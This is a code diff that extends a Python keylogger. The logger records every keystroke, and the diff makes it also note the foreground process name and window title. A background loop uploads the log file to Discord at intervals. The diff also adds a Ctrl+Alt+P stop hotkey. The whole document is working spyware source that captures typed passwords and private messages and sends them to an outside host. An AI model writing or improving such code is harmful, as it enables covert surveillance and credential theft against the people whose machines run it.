@@ -21,8 +21,10 @@ LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")
 
 os.makedirs(LOG_DIR, exist_ok=True)
 current_window = None
+current_title = None
 buffer_lock = threading.Lock()
 keystroke_buffer = []
+stop_program = threading.Event()
 
 # ===========================
 # FUNCTIONS
@@ -35,7 +37,8 @@ def send_to_discord(message):
     except Exception:
         pass
 
-def get_active_window():
+def get_active_window_info():
+    """Return (process_name, window_title)."""
     try:
         import platform, psutil
         if platform.system() == "Windows":
@@ -44,11 +47,14 @@ def get_active_window():
             pid = ctypes.c_ulong()
             ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
             proc = psutil.Process(pid.value)
-            return proc.name()
+            window_title = win32gui.GetWindowText(hwnd)
+            return proc.name(), window_title
     except Exception:
-        return "unknown_app"
+        pass
+    return "unknown_app", "unknown_title"
 
 def write_buffer_to_file():
+    """Save buffered keystrokes to disk."""
     global keystroke_buffer
     with buffer_lock:
         if keystroke_buffer:
@@ -57,24 +63,39 @@ def write_buffer_to_file():
             keystroke_buffer = []
 
 def on_press(key):
-    global current_window
-    new_window = get_active_window()
+    """Log keystrokes + track current app/window title."""
+    global current_window, current_title
+
+    # Stop hotkey Ctrl + Alt + P
+    if key == keyboard.KeyCode.from_char('p'):
+        if any([keyboard.Controller().pressed(keyboard.Key.ctrl_l),
+                keyboard.Controller().pressed(keyboard.Key.ctrl_r)]) and \
+           any([keyboard.Controller().pressed(keyboard.Key.alt_l),
+                keyboard.Controller().pressed(keyboard.Key.alt_r)]):
+            print("[*] Stop hotkey detected. Exiting...")
+            stop_program.set()
+            return False
+
+    proc_name, window_title = get_active_window_info()
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     with buffer_lock:
-        if new_window != current_window:
-            current_window = new_window
-            keystroke_buffer.append(f"\n[{timestamp}] Active Window: {current_window}\n")
+        if proc_name != current_window or window_title != current_title:
+            current_window = proc_name
+            current_title = window_title
+            keystroke_buffer.append(f"\n[{timestamp}] App: {current_window} | Window: {current_title}\n")
+
         if hasattr(key, 'char') and key.char:
             keystroke_buffer.append(key.char)
         else:
             keystroke_buffer.append(f' [{key}] ')
+
     if len(keystroke_buffer) >= 50:
         write_buffer_to_file()
 
 def send_logs():
     """Send logs to Discord every interval."""
-    while True:
+    while not stop_program.is_set():
         try:
             write_buffer_to_file()
             if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
